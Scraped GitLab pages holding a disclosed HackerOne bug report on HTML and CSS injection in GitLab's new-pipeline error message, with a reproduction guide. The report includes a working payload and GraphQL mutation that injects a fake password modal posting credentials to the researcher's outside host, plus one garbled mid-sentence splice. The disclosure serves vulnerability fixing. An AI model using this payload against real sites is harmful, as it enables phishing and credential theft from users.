=== Content from gitlab.com_1fb7e62b_20250114_213128.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2022](/gitlab-org/cves/-/tree/master/2022)
* [**CVE-2022-1416.json**](/gitlab-org/cves/-/blob/master/2022/CVE-2022-1416.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2022/CVE-2022-1416.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2022/CVE-2022-1416.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  May 19, 2022

  [03559950](/gitlab-org/cves/-/commit/0355995025ab1b3bd2ab8058af232ca3cc32a485)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/0355995025ab1b3bd2ab8058af232ca3cc32a485)
  ·
  03559950

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored May 19, 2022

  03559950

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/0355995025ab1b3bd2ab8058af232ca3cc32a485)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored May 19, 2022

Loading



=== Content from gitlab.com_564c08ac_20250114_213128.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# HTML and CSS injection in pipeline error message on /pipelines/new page

**[HackerOne report #1362405](https://hackerone.com/reports/1362405)** by `joaxcar` on 2021-10-07, assigned to GitLab Team:

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

The error message from failed pipeline runs on the "<https://gitlab.com/NAMESPACE/PROJECT/-/pipelines/new>" view are presented without proper HTML encoding. Leading to HTML and CSS injection.

When a user enters a non-existing or broken YML file as a pipeline configuration the "new pipeline" page will present an error message similar to

> The project 'namespace/project' with the file 'filename' is broken

The problem is that neither 'namespace/project' nor 'filename' are HTML encoded prior to being sent to v-safe-html in the Vue view. So if an attacker configures the project to use a file named `<h1>hack</h1>.yml` (which is a valid filepath and filename. Path `<h1>hack<` and filename `h1>.yml`) the error message will present the word hack in huge font.

The injected payload is run through DOMPurify (by v-safe-html) which prevents most of the really serious issues such as full XSS and since a month or two also from abuse of `data-*` attributes.The positioning of the injection still makes it quite dangerous as I will show.

**If you just want to confirm the behavior skip to POC. I will now explain how this could be abused.**

The first most basic abuse of the injection is to overlay the whole page with an invisible link to a malicious site. Leading to the victim in most cases being redirected to the malicious site as there is no indication that the page is a big link.

The other attack scenario is to use the flow of GitLab to lure a victim to give away their password. This can be achieved by mimicking the approval of merge request setting added to GitLab in 12.0 [link](https://docs.gitlab.com/ee/user/project/merge_requests/approvals/settings.html#require-user-password-to-approve). As this is an official workflow victims that encounter the same behavior in another part of GitLab would be more likely to actually enter their password if a similar modal when it is presented as part of a different flow.

The idea is that when a victim press the "run pipeline" button, a similar modal will appear prompting the user for a password before the pipeline is triggered. This will resemble the flow of MR approval. The problem is that the pipeline file setting is limited to 255 characters. To build a convincing modal the attacker could use CSS injection in conjunction with HTML injection and use CSS import functionality to load a arbitrary sized CSS file into the page and thus be able to create the modal, and hide the original error message. I will post first an image of the official "approval by password" modal

[![real.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/a175f7ac64e6f91938e64c57870435c1add5ed05/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f38393730346165362d366561312d346239662d383135632d6234343566633337353632622f7265616c2e706e67)

and here is my fake pipeline approval modal (I got the background a bit wrong, but this is easily fixed :) )

[![fake.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/bf0faa20ccfef680399c03be742d3ef8b2c70af6/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f37366264326631662d376134642d346335302d626662652d3064646437636364396637382f66616b652e706e67)

The CSS import works on Gitlab.com by bypassing CSP in the same way as with XSS and linking to a CSS file in a pipeline job artifact.

When the attacker gets the request containing the password the attacker can go to the pipeline log of the project to find out which user made the request. Thus, there is no need to trick the victim of entering a username.

###### The payload

My final payload to mimic the password modal takes advantage of some tricks to stay below the 255-character limit. The payload looks like this when pulled apart

```
a.yml@<style>[@]import \"/xep/x/-/jobs/1653666563/artifacts/raw/a.css\"</style><div id=\"u\">
    <form action=\"https://joaxcar.com\" method=\"POST\">
    <div></div>
    <div>
        <input placeholder=\"Password\" type=\"password\" name=\"x\">
    </div>
    <div>
    <button>Approve
    <style>
```

First of the payload needs to present a "valid filename" which is the a.yml part in the beginning. Then there is the @ separator to tell the parser that the rest of the string is a project path. As I need an @ sign in the CSS import the payload needs to be put in the path and not the file name to not be treated as a filename separator. I then import a CSS from GitLab and creates a skeleton of HTML tags for the CSS to target. All text in the modal is subsequently added by CSS as `:before` and `:after` content. All tags left open will be properly closed by DOMPurify before being injected into the page, saving a l error message should encode the filenames of failed pipelines.ot of characters. It could definitely be improved, but it shows the possibilities even with the limited payload size. The imported CSS will also hide the original error message.

##### Steps to reproduce

I will show this working through the "compliance framework" functionality which is a feature only available for Unlimited subscription plan. This is no problem as the Unlimited trail lets anyone access this. The attack is possible through regular project pipeline settings as well, but this path is a bit easier to follow. If you want to use the regular project pipeline you have to actually create the payload as a file (which is possible). Write back if you want me to do a write-up of that as well.

1. Create a user `user01`
2. Log in as `user01` and create a group `attack_group` by visiting <https://gitlab.com/groups/new>
3. Go to <https://gitlab.com/-/graphql-explorer> and run this query to create a pipeline instruction in a compliance framework

```
mutation {
  createComplianceFramework(input: {
    namespacePath: "attack_group",
    params: {
      name: "hack",
      pipelineConfigurationFullPath:"a.yml@<style>[@]import \"/xep/x/-/jobs/1653666563/artifacts/raw/a.css\"</style><div id=\"u\"><form action=\"https://joaxcar.com\" method=\"POST\"><div></div><div><input placeholder=\"Password\" type=\"password\" name=\"x\"></div><div><button>Approve<style>",
      description:"hack",
      color:"#3cb371"
    }
  }) {
    errors
  }
}

```

a simpler version that does not rely on my CSS file stored on Gitlab.com could be used to prove the impact, this one just puts in a large text in the error message

```
mutation {
  createComplianceFramework(input: {
    namespacePath: "attack_group",
    params: {
      name: "hack",
      pipelineConfigurationFullPath:"a.yml@<h1>hack</h1>",
      description:"hack",
      color:"#3cb371"
    }
  }) {
    errors
  }
}

```

4. Go to <https://gitlab.com/attack_group> and click the "New project" button to create a new project in the group. Name it `attack_project`
5. Create a `.gitlab-ci.yml` file in the project (can be empty, does not matter), for example by going to the web ide <https://gitlab.com/-/ide/project/attack_group/attack_project/tree/main/-/>
6. Go to the project settings at <https://gitlab.com/attack_group/attack_project/edit> and expand the "Compliance framework". Pick the framework we created called "hack" in the drop-down.
7. Go to <https://gitlab.com/attack_group/attack_project/-/pipelines/new> and click "Run pipeline"
8. The fake modal will pop up, this will happen to any user in the group trying to run a pipeline. Test to invite another member if you wish to test this.

##### Impact

HTML and CSS injection in pipeline error message can force a victim to visit a malicious site, show new or alter the content of the page or try to lure the victim to expose their credentials.

##### What is the current *bug* behavior?

The pipeline error messages on "pipeline/new" does not HTML encode filenames. This unencoded names are then presented in the error message through v-safe-html which strips dangerous tags but allows regular HTML and CSS.

##### What is the expected *correct* behavior?

The error message should encode the filenames of failed pipelines.

##### Output of checks

This bug happens on GitLab.com

I put this at a severity based on a similar finding patched in 14.3.1 [link](https://about.gitlab.com/releases/2021/09/30/security-release-gitlab-14-3-1-released/#content-spoofing-vulnerability)

#### Impact

HTML and CSS injection in pipeline error message can force a victim to visit a malicious site, show new or alter the content of the page or try to lure the victim to expose their credentials.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [fake.png](https://h1.sec.gitlab.net/a/76bd2f1f-7a4d-4c50-bfbe-0ddd7ccd9f78/fake.png)
* [real.png](https://h1.sec.gitlab.net/a/89704ae6-6ea1-4b9f-815c-b445fc37562b/real.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

## Proposed solution (updated as of March 31st)

* Backend to sanitize the error input

Edited Mar 31, 2022 by [Laura Montemayor](/lauraXD)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


